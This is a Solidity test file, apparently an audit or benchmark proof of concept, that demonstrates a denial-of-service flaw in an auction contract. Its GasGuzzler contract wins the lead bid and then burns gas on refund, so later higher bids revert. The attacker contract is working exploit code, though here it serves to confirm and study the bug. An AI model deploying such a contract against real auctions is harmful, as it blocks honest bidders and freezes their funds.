// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/auction.sol";

contract DoSBidTest is Test {
    DosAuction public auction;
    GasGuzzler public gasGuzzler;
    
    address constant USER1 = address(0x100);
    address constant USER2 = address(0x200);
    uint256 constant BID_DURATION = 1 days;
    uint256 constant BID1 = 1 ether;
    uint256 constant BID2 = 2 ether;
    uint256 constant BID3 = 3 ether;
    uint256 constant BID4 = 4 ether;

    function setUp() public {
        auction = new DosAuction();
        gasGuzzler = new GasGuzzler();
        
        vm.deal(USER1, 10 ether);
        vm.deal(USER2, 10 ether);
        vm.deal(address(gasGuzzler), 10 ether);
        
        // Start the auction
        auction.startAuction(BID_DURATION);
    }

    function testBidFunctionCausesDoS() public {
        // USER1 places first bid
        vm.prank(USER1);
        auction.bid{value: BID1}();

        // USER2 places higher bid (refunds USER1 successfully)
        vm.prank(USER2);
        auction.bid{value: BID2}();

        // Attacker contract places bid to become frontrunner
        vm.prank(address(gasGuzzler));
        gasGuzzler.placeBid(address(auction), BID3);

        // --- BEFORE USER1 ATTEMPT: Capture initial state ---
        console.log("--- BEFORE-Trigger USER1 Bid Attempt ---");
        address frontrunnerBefore = auction.currentFrontrunner();
        uint256 currentBidBefore = auction.currentBid();
        console.log("Initial frontrunner: %s", frontrunnerBefore);
        console.log("Initial current bid: %s", currentBidBefore);

        console.log("--- Trigger: USER1 Execute Reverting Bid ---");
        // USER1 attempts to place higher bid (fails due to gas-consuming refund)
        vm.prank(USER1);
        vm.expectRevert();
        auction.bid{value: BID4}();

        // --- AFTER USER1 ATTEMPT: Capture post-attack state ---
        console.log("--- AFTER-Trigger USER1 Bid Attempt ---");
        address frontrunnerAfter = auction.currentFrontrunner();
        uint256 currentBidAfter = auction.currentBid();
        console.log("Final frontrunner: %s", frontrunnerAfter);
        console.log("Final current bid: %s", currentBidAfter);

        // State comparison
        bool stateUnchanged = (frontrunnerBefore == frontrunnerAfter) && 
                             (currentBidBefore == currentBidAfter);
        if (stateUnchanged) {
            console.log("Vulnerability Exists: Auction state unchanged after failed USER1 bid, confirming DoS vulnerability");
        } else {
            console.log("Vulnerability not Exist: Auction state changed during USER1 bid, indicating failed DoS attack");
        }
    }
}

contract GasGuzzler {
    uint256[] public dummyData;

    // Fallback function that consumes excessive gas (>2300)
    receive() external payable {
        for(uint256 i = 0; i < 10; i++) {
            dummyData.push(i); // Storage write consumes >20000 gas
        }
    }

    function placeBid(address auctionAddr, uint256 amount) external payable {
        (bool success, ) = auctionAddr.call{value: amount}(
            abi.encodeWithSignature("bid()")
        );
        require(success, "Bid failed");
    }
}